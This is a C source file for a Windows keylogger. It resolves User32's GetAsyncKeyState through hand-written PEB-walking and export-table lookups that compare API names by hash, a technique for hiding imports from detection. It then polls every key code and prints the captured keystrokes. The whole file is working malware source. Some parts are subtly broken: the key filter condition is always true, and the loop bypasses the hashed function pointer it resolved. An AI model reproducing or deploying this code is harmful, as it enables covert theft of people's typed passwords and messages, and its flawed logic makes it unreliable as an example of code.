#include "header.h"

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB      pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	 pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
			
			// Converting `FullDllName.Buffer` to upper case string 
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';

			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
				return (HMODULE) pDte->Reserved2[0];
			
		} else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;
	
	PIMAGE_DOS_HEADER         pImgDosHdr			  = (PIMAGE_DOS_HEADER)pBase;

	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS         pImgNtHdrs			  = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER     ImgOptHdr			  = pImgNtHdrs->OptionalHeader;
	
	PIMAGE_EXPORT_DIRECTORY   pImgExportDir		  = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


	PDWORD  FunctionNameArray		= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD  FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD   FunctionOrdinalArray	= (PWORD) (pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Hashing every function name pFunctionName
		// If both hashes are equal then we found the function we want 
		if (dwApiNameHash == HASHA(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

VOID KeyboardClicksLogger() {
    SHORT               state               = NULL;
    HMODULE		        hUser32Module	    = NULL;
    fnGetAsyncKeyState  pGetAsyncKeyState   = NULL;

	// Load User32.dll to the current process so that GetModuleHandleH will work
	if (LoadLibraryA("USER32.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return;
	}

	// Getting the handle of user32.dll using GetModuleHandleH
    printf("[i] Original 0x%p\n", GetModuleHandle("USER32.DLL"));
	hUser32Module = GetModuleHandleH( [["USER32.DLL"]] );
	if (hUser32Module == NULL){
		printf("[!] Couldn't Get Handle To User32.dll \n");
		return;
	}
    printf("[i] Replacement 0x%p\n", hUser32Module);
    // Getting the address of GetAsyncKeyState function using GetProcAddressH
    pGetAsyncKeyState = (fnGetAsyncKeyState)GetProcAddressH(hUser32Module, [["GetAsyncKeyState"]] );
    if (pGetAsyncKeyState == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return;
    }

    printf("[*] Output: ");

	while (TRUE) {
        // Sleep for better performance
        // We dont need to query every clock cycle so lets sleep for 10 milliseconds
        Sleep(10);
        
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Range from 0x01-0xFE
		for (int i = 1; i < 255; i++) {
            // Get state
            state = GetAsyncKeyState(i);
			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            // 1        = press
            // -32767   = held down
            if (state == 1 || state == -32767) {
                // Remove mouse inputs (0x01-0x07), fn keys (0x70-0x8F)
                if (( 7 < i) && ( 120 < i || i < 143))
				    printf("\\x%02X", i);
            }
		}
	}
    
    return;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    return 0;
}